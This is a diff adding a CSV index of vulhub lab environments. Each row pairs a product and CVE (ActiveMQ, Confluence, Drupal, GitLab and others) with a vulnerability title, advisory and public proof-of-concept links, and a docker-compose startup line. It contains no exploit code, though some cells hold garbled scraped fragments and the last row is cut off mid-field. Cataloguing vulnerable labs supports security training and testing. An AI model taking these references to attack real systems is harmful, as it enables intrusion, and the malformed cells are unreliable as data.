@@ -1,0 +1,815 @@
+﻿Name,CVE,Description,References,Path,Type,Startup,Vector
+activemq,CVE-2022-41678,Apache ActiveMQ Jolokia Authenticated Remote Code Execution (CVE-2022-41678),"https://activemq.apache.org/security-advisories.data/CVE-2022-41678-announcement.txt
+https://l3yx.github.io/2023/11/29/Apache-ActiveMQ-Jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2022-41678-%E5%88%86%E6%9E%90/
+http://localhost
+http://your-ip:8161
+http://localhost:8161",https://github.com/vulhub/vulhub/tree/master/activemq/CVE-2022-41678,docker-compose,docker compose up,remote
+activemq,CVE-2016-3088,ActiveMQ Arbitrary File Write Vulnerability (CVE-2016-3088),,https://github.com/vulhub/vulhub/tree/master/activemq/CVE-2016-3088,docker-compose,docker compose up,remote
+activemq,CVE-2023-46604,Apache ActiveMQ OpenWire Protocol Deserialization RCE (CVE-2023-46604),"https://activemq.apache.org/news/cve-2023-46604
+https://xz.aliyun.com/t/12929
+https://boogipop.com/2023/11/03/Apache%20ActiveMQ%20CVE-2023-46604%20RCE%20%E5%88%86%E6%9E%90/
+https://forum.butian.net/share/2566
+http://ip",https://github.com/vulhub/vulhub/tree/master/activemq/CVE-2023-46604,docker-compose,docker compose up,remote
+activemq,CVE-2015-5254,ActiveMQ Deserialization Vulnerability (CVE-2015-5254),https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf,https://github.com/vulhub/vulhub/tree/master/activemq/CVE-2015-5254,docker-compose,docker compose up,remote
+adminer,CVE-2021-21311,Adminer Server-side Request Forgery on Error Page of Elasticsearch and ClickHouse (CVE-2021-21311),"https://github.com/vrana/adminer/security/advisories/GHSA-x5r2-hj5c-8jx6
+https://github.com/vrana/adminer/files/5957311/Adminer.SSRF.pdf
+https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2021/CVE-2021-21311.yaml",https://github.com/vulhub/vulhub/tree/master/adminer/CVE-2021-21311,docker-compose,docker compose up,remote
+adminer,CVE-2021-43008,Adminer Remote Arbitrary File Read (CVE-2021-43008),"https://github.com/p0dalirius/CVE-2021-43008-AdminerRead
+http://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability",https://github.com/vulhub/vulhub/tree/master/adminer/CVE-2021-43008,docker-compose,docker compose up,remote
+airflow,CVE-2020-17526,Apache Airflow Authentication Bypass (CVE-2020-17526),"https://lists.apache.org/thread/rxn1y1f9fco3w983vk80ps6l32rzm6t0
+https://kloudle.com/academy/authentication-bypass-in-apache-airflow-cve-2020-17526-and-aws-cloud-platform-compromise
+http://localhost:8080/admin/airflow/login",https://github.com/vulhub/vulhub/tree/master/airflow/CVE-2020-17526,docker-compose,docker compose up,remote
+airflow,CVE-2020-11981,Apache Airflow Celery Broker Remote Command Execution (CVE-2020-11981),"https://lists.apache.org/thread/cn57zwylxsnzjyjztwqxpmly0x9q5ljx
+https://github.com/apache/airflow/pull/9178",https://github.com/vulhub/vulhub/tree/master/airflow/CVE-2020-11981,docker-compose,docker compose up,remote
+airflow,CVE-2020-11978,Apache Airflow Command Injection in Example Dag (CVE-2020-11978),"https://lists.apache.org/thread/cn57zwylxsnzjyjztwqxpmly0x9q5ljx
+https://github.com/pberba/CVE-2020-11978",https://github.com/vulhub/vulhub/tree/master/airflow/CVE-2020-11978,docker-compose,docker compose up,remote
+aj-report,Unknown,AJ-Report Authentication Bypass and Remote Code Execution (CNVD-2024-15077),"https://xz.aliyun.com/t/14460
+https://github.com/wy876/POC/blob/main/AJ-Report%E5%BC%80%E6%BA%90%E6%95%B0%E6%8D%AE%E5%A4%A7%E5%B1%8F%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md",unknown,docker-compose,docker compose up,remote
+apache-cxf,CVE-2024-28752,Apache CXF Aegis DataBinding Server-Side Request Forgery (CVE-2024-28752),"https://github.com/advisories/GHSA-qmgx-j96g-4428
+https://nvd.nist.gov/vuln/detail/CVE-2024-28752
+https://github.com/ReaJason/CVE-2024-28752",https://github.com/vulhub/vulhub/tree/master/apache-cxf/CVE-2024-28752,docker-compose,docker compose up,remote
+apache-druid,CVE-2021-25646,Apache Druid Embedded Javascript Remote Code Execution (CVE-2021-25646),"https://blogs.juniper.net/en-us/threat-research/cve-2021-25646-apache-druid-embedded-javascript-remote-code-execution
+https://mp.weixin.qq.com/s/McAoLfyf_tgFIfGTAoRCiw",https://github.com/vulhub/vulhub/tree/master/apache-druid/CVE-2021-25646,docker-compose,docker compose up,remote
+apereo-cas,Unknown,Apereo CAS 4.1 Deserialization RCE Vulnerability,"https://apereo.github.io/2016/04/08/commonsvulndisc/
+http://your-ip:8080
+http://your-ip:8080/cas/login",unknown,docker-compose,docker compose up,remote
+apisix,CVE-2020-13945,Apache APISIX Hardcoded API Token Leads to RCE (CVE-2020-13945),"https://apisix.apache.org/docs/apisix/getting-started
+https://github.com/apache/apisix/pull/2244
+https://seclists.org/oss-sec/2020/q4/187",https://github.com/vulhub/vulhub/tree/master/apisix/CVE-2020-13945,docker-compose,docker compose up,remote
+apisix,CVE-2021-45232,Apache APISIX Dashboard Unauthenticated Access Leads to RCE (CVE-2021-45232),"https://apisix.apache.org/blog/2021/12/28/dashboard-cve-2021-45232/
+https://github.com/wuppp/cve-2021-45232-exp",https://github.com/vulhub/vulhub/tree/master/apisix/CVE-2021-45232,docker-compose,docker compose up,remote
+appweb,CVE-2018-8715,AppWeb Authentication Bypass vulnerability (CVE-2018-8715),https://ssd-disclosure.com/index.php/archives/3676,https://github.com/vulhub/vulhub/tree/master/appweb/CVE-2018-8715,docker-compose,docker compose up,remote
+aria2,Unknown,Aria2 Arbitrary File Write Vulnerability,"https://paper.seebug.org/120/
+http://binux.github.io/yaaw/demo/
+https://paper.seebug.org/120/",unknown,docker-compose,docker compose up,remote
+bash,CVE-2014-6271,Bash Shellshock Remote Command Injection (CVE-2014-6271),,https://github.com/vulhub/vulhub/tree/master/bash/CVE-2014-6271,docker-compose,docker compose up,remote
+cacti,CVE-2022-46169,Cacti remote_agent.php Pre-Auth Command Injection (CVE-2022-46169),"https://github.com/Cacti/cacti/security/advisories/GHSA-6p93-p743-35gf
+https://mp.weixin.qq.com/s/6crwl8ggMkiHdeTtTApv3A",https://github.com/vulhub/vulhub/tree/master/cacti/CVE-2022-46169,docker-compose,docker compose up,remote
+cacti,CVE-2023-39361,Cacti graph_view.php SQL Injection Leads to RCE (CVE-2023-39361/CVE-2024-31459),"https://github.com/Cacti/cacti/security/advisories/GHSA-6r43-q2fw-5wrg
+https://github.com/Cacti/cacti/security/advisories/GHSA-cx8g-hvq8-p2rv",https://github.com/vulhub/vulhub/tree/master/cacti/CVE-2023-39361,docker-compose,docker compose up,remote
+cacti,CVE-2025-24367,Cacti RRDTool Post-Auth Argument Injection Leads to RCE (CVE-2025-24367),"https://github.com/Cacti/cacti/security/advisories/GHSA-fxrq-fr7h-9rqq
+https://github.com/Cacti/cacti/commit/c7e4ee798d263a3209ae6e7ba182c7b65284d8f0
+http://your-ip:8080",https://github.com/vulhub/vulhub/tree/master/cacti/CVE-2025-24367,docker-compose,docker compose up,remote
+celery,Unknown,Celery <4.0 Redis unauthorized access + Pickle deserialization exploit,,unknown,docker-compose,docker compose up,remote
+cgi,CVE-2016-5385,CGI Application Environment Variable Injection by HTTPoxy (CVE-2016-5385),"https://httpoxy.org
+http://*.*.122.65:8888/`:",https://github.com/vulhub/vulhub/tree/master/cgi/CVE-2016-5385,docker-compose,docker compose up,remote
+cmsms,CVE-2019-9053,CMS Made Simple (CMSMS) < 2.2.10 Unauthenticated SQL Injection (CVE-2019-9053),"https://www.exploit-db.com/exploits/46635
+https://srcincite.io/pocs/cve-2021-26120.py.txt
+https://www.exploit-db.com/exploits/46635
+http://127.0.0.1",https://github.com/vulhub/vulhub/tree/master/cmsms/CVE-2019-9053,docker-compose,docker compose up,remote
+cmsms,CVE-2021-26120,CMS Made Simple (CMSMS) Unauthenticated Remote Code Execution (CVE-2019-9053/CVE-2021-26120),"https://srcincite.io/pocs/cve-2021-26120.py.txt
+https://www.exploit-db.com/exploits/46635
+https://srcincite.io/pocs/cve-2021-26120.py.txt",https://github.com/vulhub/vulhub/tree/master/cmsms/CVE-2021-26120,docker-compose,docker compose up,remote
+coldfusion,CVE-2023-29300,Adobe ColdFusion XML Deserialization Leads to RCE (CVE-2023-29300),"https://blog.projectdiscovery.io/adobe-coldfusion-rce/
+https://xz.aliyun.com/t/13413",https://github.com/vulhub/vulhub/tree/master/coldfusion/CVE-2023-29300,docker-compose,docker compose up,remote
+coldfusion,CVE-2023-26360,Adobe ColdFusion Local File Inclusion Leads to RCE (CVE-2023-26360),https://xz.aliyun.com/t/13392,https://github.com/vulhub/vulhub/tree/master/coldfusion/CVE-2023-26360,docker-compose,docker compose up,remote
+coldfusion,CVE-2017-3066,Adobe ColdFusion AMF Deserialization Remote Command Execution (CVE-2017-3066),"https://codewhitesec.blogspot.com.au/2018/03/exploiting-adobe-coldfusion.html
+https://www.exploit-db.com/exploits/43993
+https://github.com/codewhitesec/ColdFusionPwn",https://github.com/vulhub/vulhub/tree/master/coldfusion/CVE-2017-3066,docker-compose,docker compose up,remote
+coldfusion,CVE-2010-2861,Adobe ColdFusion Directory Traversal Vulnerability (CVE-2010-2861),,https://github.com/vulhub/vulhub/tree/master/coldfusion/CVE-2010-2861,docker-compose,docker compose up,remote
+confluence,CVE-2019-3396,Atlassian Confluence Path Traversal Leads to RCE (CVE-2019-3396),"https://paper.seebug.org/884/
+https://jira.atlassian.com/browse/CONFSERVER-57974
+http://localhost:8090/pages/resumedraft.action?draftId=786457&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&",https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2019-3396,docker-compose,docker compose up,remote
+confluence,CVE-2023-22515,Atlassian Confluence Access Control Broken by Attributes Overwrite (CVE-2023-22515),"https://confluence.atlassian.com/security/cve-2023-22515-privilege-escalation-vulnerability-in-confluence-data-center-and-server-1295682276.html
+https://attackerkb.com/topics/Q5f0ItSzw5/cve-2023-22515/rapid7-analysis",https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2023-22515,docker-compose,docker compose up,remote
+confluence,CVE-2022-26134,Atlassian Confluence Pre-Auth Remote Code Execution via OGNL Injection (CVE-2022-26134),"https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html
+https://attackerkb.com/topics/BH1D56ZEhs/cve-2022-26134/rapid7-analysis",https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2022-26134,docker-compose,docker compose up,remote
+confluence,CVE-2023-22527,Atlassian Confluence Pre-Auth Remote Code Execution via OGNL Injection (CVE-2023-22527),"https://confluence.atlassian.com/security/cve-2023-22527-rce-remote-code-execution-vulnerability-in-confluence-data-center-and-confluence-server-1333990257.html
+https://blog.projectdiscovery.io/atlassian-confluence-ssti-remote-code-execution/",https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2023-22527,docker-compose,docker compose up,remote
+confluence,CVE-2021-26084,Atlassian Confluence Webwork Pre-Auth OGNL Injection Leads to RCE (CVE-2021-26084),"https://confluence.atlassian.com/doc/confluence-security-advisory-2021-08-25-1077906215.html
+https://jira.atlassian.com/browse/CONFSERVER-67940
+https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md
+https://github.com/h3v0x/CVE-2021-26084_Confluence
+http://192.168.1.162:8090/template/custom/content-editor.vm",https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2021-26084,docker-compose,docker compose up,remote
+couchdb,CVE-2017-12636,Couchdb Arbitrary Command Execution (CVE-2017-12636),"https://justi.cz/security/2017/11/14/couchdb-rce-npm.html
+https://www.exploit-db.com/exploits/44498
+http://bobao.360.cn/learning/detail/4716.html
+http://vulhub:vulhub@your-ip:5984/_membership
+http://vulhub:vulhub@your-ip:5984/_node/nonode@nohost/_config/query_servers/cmd
+http://vulhub:vulhub@your-ip:5984/vultest/_design/vul",https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12636,docker-compose,docker compose up,remote
+couchdb,CVE-2017-12635,Apache Couchdb Remote Privilege Escalation (CVE-2017-12635),"https://justi.cz/security/2017/11/14/couchdb-rce-npm.html
+https://www.exploit-db.com/exploits/44498
+http://bobao.360.cn/learning/detail/4716.html",https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12635,docker-compose,docker compose up,remote
+couchdb,CVE-2022-24706,CouchDB Erlang distribution Remote Command Execution (CVE-2022-24706),"https://docs.couchdb.org/en/3.2.2-docs/cve/2022-24706.html
+https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/
+https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/multi/misc/erlang_cookie_rce.rb
+https://github.com/sadshade/CVE-2022-24706-CouchDB-Exploit",https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2022-24706,docker-compose,docker compose up,remote
+craftcms,CVE-2023-41892,CraftCMS ConditionsController Pre-Auth Remote Code Execution (CVE-2023-41892),"https://github.com/craftcms/cms/security/advisories/GHSA-4w8r-3xrw-v25g
+https://blog.calif.io/p/craftcms-rce
+https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/",https://github.com/vulhub/vulhub/tree/master/craftcms/CVE-2023-41892,docker-compose,docker compose up,remote
+craftcms,CVE-2024-56145,CraftCMS registerargcargv Leads to Remote Code Execution (CVE-2024-56145),"https://github.com/craftcms/cms/security/advisories/GHSA-2p6p-9rc9-62j9
+https://www.assetnote.io/resources/research/how-an-obscure-php-footgun-led-to-rce-in-craft-cms",https://github.com/vulhub/vulhub/tree/master/craftcms/CVE-2024-56145,docker-compose,docker compose up,remote
+cups-browsed,CVE-2024-47177,OpenPrinting Cups-Browsed Remote Code Execution via The FoomaticRIPCommandLine PPD parameter (CVE-2024-47177),"https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/
+https://github.com/OpenPrinting/cups-browsed/security/advisories/GHSA-rj88-6mr5-rcw8",https://github.com/vulhub/vulhub/tree/master/cups-browsed/CVE-2024-47177,docker-compose,docker compose up,remote
+discuz,Unknown,Discuz!X ≤3.4 Arbitrary File Deletion,https://lorexxar.cn/2017/09/30/dz-delete/,unknown,docker-compose,docker compose up,remote
+discuz,Unknown,Discuz 7.x/6.x Remote Code Execution via Global Variable Override,https://www.secpulse.com/archives/2338.html,unknown,docker-compose,docker compose up,remote
+django,CVE-2021-35042,Django QuerySet.order_by() SQL Injection (CVE-2021-35042),https://www.djangoproject.com/weblog/2021/jul/01/security-releases/,https://github.com/vulhub/vulhub/tree/master/django/CVE-2021-35042,docker-compose,docker compose up,remote
+django,CVE-2019-14234,Django JSONField/HStoreField SQL Injection (CVE-2019-14234),"https://www.djangoproject.com/weblog/2019/aug/01/security-releases/
+https://www.leavesongs.com/PENETRATION/django-jsonfield-cve-2019-14234.html",https://github.com/vulhub/vulhub/tree/master/django/CVE-2019-14234,docker-compose,docker compose up,remote
+django,CVE-2022-34265,Django Trunc(kind) and Extract(lookup_name) SQL Injection (CVE-2022-34265),"https://www.djangoproject.com/weblog/2022/jul/04/security-releases/
+https://github.com/django/django/commit/0dc9c016fadb71a067e5a42be30164e3f96c0492",https://github.com/vulhub/vulhub/tree/master/django/CVE-2022-34265,docker-compose,docker compose up,remote
+django,CVE-2017-12794,Django 500 Debug Page Cross-Site Scripting (XSS) (CVE-2017-12794),"https://www.djangoproject.com/weblog/2017/sep/05/security-releases/
+https://nvd.nist.gov/vuln/detail/CVE-2017-12794
+https://www.leavesongs.com/PENETRATION/django-debug-page-xss.html
+https://www.leavesongs.com/PENETRATION/django-debug-page-xss.html",https://github.com/vulhub/vulhub/tree/master/django/CVE-2017-12794,docker-compose,docker compose up,remote
+django,CVE-2020-9402,Django GIS functions and aggregates on Oracle SQL Injection (CVE-2020-9402),https://www.djangoproject.com/weblog/2020/mar/04/security-releases/,https://github.com/vulhub/vulhub/tree/master/django/CVE-2020-9402,docker-compose,docker compose up,remote
+django,CVE-2018-14574,Django < 2.0.8 Open Redirect in CommonMiddleware (CVE-2018-14574),"https://www.djangoproject.com/weblog/2018/aug/01/security-releases/
+https://nvd.nist.gov/vuln/detail/CVE-2018-14574",https://github.com/vulhub/vulhub/tree/master/django/CVE-2018-14574,docker-compose,docker compose up,remote
+dns,Unknown,DNS Zone Transfers (AXFR),"https://www.acunetix.com/blog/articles/dns-zone-transfers-axfr/
+https://nmap.org/nsedoc/scripts/dns-zone-transfer.html",unknown,docker-compose,docker compose up,remote
+docker,Unknown,Docker Remote API Unauthorized Access Leads to Remote Code Execution,"https://docs.docker.com/engine/security/protect-access/
+https://tttang.com/archive/357/",unknown,docker-compose,docker compose up,remote
+drupal,CVE-2018-7600,Drupal Drupalgeddon 2 Unauthenticated Remote Code Execution (CVE-2018-7600),"https://www.drupal.org/sa-core-2018-002
+https://research.checkpoint.com/uncovering-drupalgeddon-2/",https://github.com/vulhub/vulhub/tree/master/drupal/CVE-2018-7600,docker-compose,docker compose up,remote
+drupal,CVE-2019-6341,Drupal Cross-Site Scripting by File Upload (CVE-2019-6341),"https://www.drupal.org/sa-core-2019-004
+https://www.zerodayinitiative.com/blog/2019/4/11/a-series-of-unfortunate-images-drupal-1-click-to-rce-exploit-chain-detailed
+https://paper.seebug.org/897/",https://github.com/vulhub/vulhub/tree/master/drupal/CVE-2019-6341,docker-compose,docker compose up,remote
+drupal,CVE-2019-6339,Drupal Remote Code Execution by phar deserialization (CVE-2019-6339),"https://www.drupal.org/sa-core-2019-002
+https://www.zerodayinitiative.com/blog/2019/4/11/a-series-of-unfortunate-images-drupal-1-click-to-rce-exploit-chain-detailed
+https://paper.seebug.org/897/",https://github.com/vulhub/vulhub/tree/master/drupal/CVE-2019-6339,docker-compose,docker compose up,remote
+drupal,CVE-2017-6920,Drupal Core 8 PECL YAML Deserialization Remote Code Execution (CVE-2017-6920),"https://www.drupal.org/forum/newsletters/security-advisories-for-drupal-core/2017-06-21/drupal-core-multiple
+https://paper.seebug.org/334/",https://github.com/vulhub/vulhub/tree/master/drupal/CVE-2017-6920,docker-compose,docker compose up,remote
+drupal,CVE-2014-3704,"Drupal < 7.32 ""Drupalgeddon"" SQL Injection (CVE-2014-3704)","https://www.drupal.org/SA-CORE-2014-005
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3704",https://github.com/vulhub/vulhub/tree/master/drupal/CVE-2014-3704,docker-compose,docker compose up,remote
+drupal,CVE-2018-7602,Drupal Drupalgeddon 3 Authenticated Remote Code Execution (CVE-2018-7602),"https://www.drupal.org/sa-core-2018-004
+https://github.com/pimps/CVE-2018-7600
+https://github.com/kastellanos/CVE-2018-7602
+http://127.0.0.1:8080/",https://github.com/vulhub/vulhub/tree/master/drupal/CVE-2018-7602,docker-compose,docker compose up,remote
+dubbo,CVE-2019-17564,Aapche Dubbo Unsafe Java Deserialization (CVE-2019-17564),"https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/remoting/httpinvoker/HttpInvokerServiceExporter.html
+https://www.anquanke.com/post/id/198747
+https://paper.seebug.org/1128/
+http://your-ip:8080/org.vulhub.api.CalcService",https://github.com/vulhub/vulhub/tree/master/dubbo/CVE-2019-17564,docker-compose,docker compose up,remote
+ecshop,Unknown,ECShop 2.x/3.x SQL Injection / Remote Code Execution Vulnerability,https://paper.seebug.org/691/,unknown,docker-compose,docker compose up,remote
+ecshop,Unknown,ECShop 4.x collection_list SQL Injection,"https://mp.weixin.qq.com/s/xHioArEpoAqGlHJPfq3Jiw
+http://foreversong.cn/archives/1556",unknown,docker-compose,docker compose up,remote
+elasticsearch,CVE-2014-3120,ElasticSearch Remote Code Execution (CVE-2014-3120),"https://bou.ke/blog/elasticsearch-rce/
+https://www.exploit-db.com/exploits/33370",https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2014-3120,docker-compose,docker compose up,remote
+elasticsearch,CVE-2015-3337,ElasticSearch Plug-in Directory Traversal (CVE-2015-3337),"https://nvd.nist.gov/vuln/detail/CVE-2015-3337
+https://github.com/elastic/elasticsearch/issues/10828
+https://github.com/mobz/elasticsearch-head",https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2015-3337,docker-compose,docker compose up,remote
+elasticsearch,CVE-2015-5531,ElasticSearch Snapshot and Restore Directory Traversal (CVE-2015-5531),"https://www.exploit-db.com/exploits/38383/
+http://www.freebuf.com/vuls/99942.html",https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2015-5531,docker-compose,docker compose up,remote
+elasticsearch,CVE-2015-1427,ElasticSearch Groovy Sandbox Bypass and Remote Code Execution (CVE-2015-1427),"http://jordan-wright.com/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/
+https://github.com/XiphosResearch/exploits
+http://cb.drops.wiki/drops/papers-5107.html
+http://cb.drops.wiki/drops/papers-5142.html",https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2015-1427,docker-compose,docker compose up,remote
+elasticsearch,Unknown,ElasticSearch Arbitrary File Upload (WooYun-2015-110216),"http://cb.drops.wiki/bugs/wooyun-2015-0110216.html
+http://127.0.0.1:9200/yz.jsp/yz.jsp/1",unknown,docker-compose,docker compose up,remote
+electron,CVE-2018-15685,Electron WebPreferences Remote Code Execution Vulnerability（CVE-2018-15685）,"https://electronjs.org/blog/web-preferences-fix
+https://www.contrastsecurity.com/security-influencers/cve-2018-15685",https://github.com/vulhub/vulhub/tree/master/electron/CVE-2018-15685,docker-compose,docker compose up,remote
+electron,CVE-2018-1000006,Electron Remote Code Execution Vulnerability（CVE-2018-1000006）,,https://github.com/vulhub/vulhub/tree/master/electron/CVE-2018-1000006,docker-compose,docker compose up,remote
+elfinder,CVE-2021-32682,elFinder ZIP Arguments Injection Leads to Commands Injection (CVE-2021-32682),"https://blog.sonarsource.com/elfinder-case-study-of-web-file-manager-vulnerabilities
+https://packetstormsecurity.com/files/164173/elfinder_archive_cmd_injection.rb.txt
+https://xz.aliyun.com/t/10739
+http://localhost.lan:8080/",https://github.com/vulhub/vulhub/tree/master/elfinder/CVE-2021-32682,docker-compose,docker compose up,remote
+erlang,CVE-2025-32433,Unauthenticated Remote Code Execution in Erlang/OTP SSH (CVE-2025-32433),"https://github.com/erlang/otp/security/advisories/GHSA-37cp-fgq5-7wc2
+https://github.com/erlang/otp/commit/6eef04130afc8b0ccb63c9a0d8650209cf54892f#diff-ceeb1aeeb602e1424c13d9da9383e0782f65869d6e64e015c194145b1a64edcd
+https://github.com/ProDefense/CVE-2025-32433
+https://datatracker.ietf.org/doc/html/rfc4254",https://github.com/vulhub/vulhub/tree/master/erlang/CVE-2025-32433,docker-compose,docker compose up,remote
+fastjson,Unknown,Fastjson 1.2.47 Deserialization Remote Command Execution,"https://cert.360.cn/warning/detail?id=7240aeab581c6dc2c9c5350756079955
+https://www.freebuf.com/vuls/208339.html",unknown,docker-compose,docker compose up,remote
+fastjson,Unknown,"Alert
+
+This file is move to Here
+-------------------------------------------------------------------------------",,unknown,docker-compose,docker compose up,remote
+fastjson,Unknown,Fastjson 1.2.24 Deserialization Remote Command Execution (CVE-2017-18349),"https://www.freebuf.com/vuls/208339.html
+http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/
+http://your-ip:8090/",unknown,docker-compose,docker compose up,remote
+ffmpeg,CVE-2017-9993,FFmpeg AVI Arbitrary File Read (CVE-2017-9993),"https://docs.google.com/presentation/d/1yqWy_aE3dQNXAhW8kxMxRqtP7qMHaIfMzUDpEqFneos/
+https://github.com/neex/ffmpeg-avi-m3u-xbin
+https://www.anquanke.com/post/id/86337
+https://github.com/neex/ffmpeg-avi-m3u-xbin",https://github.com/vulhub/vulhub/tree/master/ffmpeg/CVE-2017-9993,docker-compose,docker compose up,remote
+ffmpeg,CVE-2016-1897,FFmpeg Arbitrary File Read and SSRF (CVE-2016-1897/CVE-2016-1898),"https://tttang.com/archive/465/
+http://habrahabr.ru/company/mailru/blog/274855/
+http://xdxd.love/2016/01/18/ffmpeg-SSRF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/",https://github.com/vulhub/vulhub/tree/master/ffmpeg/CVE-2016-1897,docker-compose,docker compose up,remote
+flask,Unknown,Flask (Jinja2) Server-Side Template Injection,"https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf
+http://rickgray.me/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates",unknown,docker-compose,docker compose up,remote
+flink,CVE-2020-17518,Apache Flink Upload Path Traversal (CVE-2020-17518),"https://github.com/apache/flink/commit/a5264a6f41524afe8ceadf1d8ddc8c80f323ebc4
+https://nvd.nist.gov/vuln/detail/CVE-2020-17518",https://github.com/vulhub/vulhub/tree/master/flink/CVE-2020-17518,docker-compose,docker compose up,remote
+flink,CVE-2020-17519,Apache Flink jobmanager/logs Path Traversal (CVE-2020-17519),"https://github.com/apache/flink/commit/b561010b0ee741543c3953306037f00d7a9f0801
+https://nvd.nist.gov/vuln/detail/CVE-2020-17519",https://github.com/vulhub/vulhub/tree/master/flink/CVE-2020-17519,docker-compose,docker compose up,remote
+geoserver,CVE-2024-36401,GeoServer Unauthenticated Remote Code Execution in Evaluating Property Name Expressions (CVE-2024-36401),"https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv
+https://github.com/geotools/geotools/security/advisories/GHSA-w3pj-wh35-fq8w
+https://tttang.com/archive/1771/
+https://github.com/Warxim/CVE-2022-41852",https://github.com/vulhub/vulhub/tree/master/geoserver/CVE-2024-36401,docker-compose,docker compose up,remote
+geoserver,CVE-2022-24816,GeoServer Remote Code Injection caused by JAI-EXT (CVE-2022-24816/CVE-2023-35042),"https://www.synacktiv.com/publications/exploiting-cve-2022-24816-a-code-injection-in-the-jt-jiffle-extension-of-geoserver
+https://github.com/geosolutions-it/jai-ext/security/advisories/GHSA-v92f-jx6p-73rx
+https://geoserver.org/vulnerability/2022/04/11/geoserver-2-jiffle-jndi-rce.html
+https://osgeo-org.atlassian.net/browse/GEOS-10458
+https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2022/CVE-2022-24816.yaml
+http://schemas.opengis.net/wps/1.0.0/wpsAll.xsd"">",https://github.com/vulhub/vulhub/tree/master/geoserver/CVE-2022-24816,docker-compose,docker compose up,remote
+geoserver,CVE-2021-40822,GeoServer Unauthenticated Server-Side Request Forgery (CVE-2021-40822),"https://github.com/geoserver/geoserver/security/advisories/GHSA-7g5f-wrx8-5ccf
+https://nvd.nist.gov/vuln/detail/CVE-2021-40822",https://github.com/vulhub/vulhub/tree/master/geoserver/CVE-2021-40822,docker-compose,docker compose up,remote
+geoserver,CVE-2023-25157,GeoServer OGC Filter SQL Injection (CVE-2023-25157),"https://github.com/murataydemir/CVE-2023-25157-and-CVE-2023-25158
+https://github.com/advisories/GHSA-7g5f-wrx8-5ccf",https://github.com/vulhub/vulhub/tree/master/geoserver/CVE-2023-25157,docker-compose,docker compose up,remote
+ghostscript,CVE-2018-16509,GhostScript Sandbox Bypass Command Execution (CVE-2018-16509),"http://seclists.org/oss-sec/2018/q3/142
+https://bugs.chromium.org/p/project-zero/issues/detail?id=1640",https://github.com/vulhub/vulhub/tree/master/ghostscript/CVE-2018-16509,docker-compose,docker compose up,remote
+ghostscript,CVE-2018-19475,GhostScript Sandbox Bypass Command Execution (CVE-2018-19475),"https://blog.semmle.com/ghostscript-CVE-2018-19475/
+https://bugs.ghostscript.com/show_bug.cgi?id=700153",https://github.com/vulhub/vulhub/tree/master/ghostscript/CVE-2018-19475,docker-compose,docker compose up,remote
+ghostscript,CVE-2019-6116,GhostScript Sandbox Bypass Command Execution (CVE-2019-6116),"https://bugs.chromium.org/p/project-zero/issues/detail?id=1729&desc=2
+https://www.anquanke.com/post/id/170255",https://github.com/vulhub/vulhub/tree/master/ghostscript/CVE-2019-6116,docker-compose,docker compose up,remote
+git,CVE-2017-8386,GIT-SHELL Sandbox Bypass Leads to RCE (CVE-2017-8386),"https://insinuator.net/2017/05/git-shell-bypass-by-abusing-less-cve-2017-8386/
+https://www.leavesongs.com/PENETRATION/git-shell-cve-2017-8386.html",https://github.com/vulhub/vulhub/tree/master/git/CVE-2017-8386,docker-compose,docker compose up,remote
+gitea,Unknown,Gitea 1.4.0 Directory Traversal Leading to Remote Command Execution,"https://security.szurek.pl/gitea-1-4-0-unauthenticated-rce.html
+https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html",unknown,docker-compose,docker compose up,remote
+gitlab,CVE-2016-9086,GitLab Arbitrary File Disclosure (CVE-2016-9086),"https://about.gitlab.com/releases/2016/11/02/cve-2016-9086-patches/
+https://hackerone.com/reports/178152
+http://paper.seebug.org/104/",https://github.com/vulhub/vulhub/tree/master/gitlab/CVE-2016-9086,docker-compose,docker compose up,remote
+gitlab,CVE-2021-22205,GitLab Pre-Auth Remote Command Execution (CVE-2021-22205),"https://hackerone.com/reports/1154542
+https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html
+https://security.humanativaspa.it/gitlab-ce-cve-2021-22205-in-the-wild/
+https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-22205.yaml
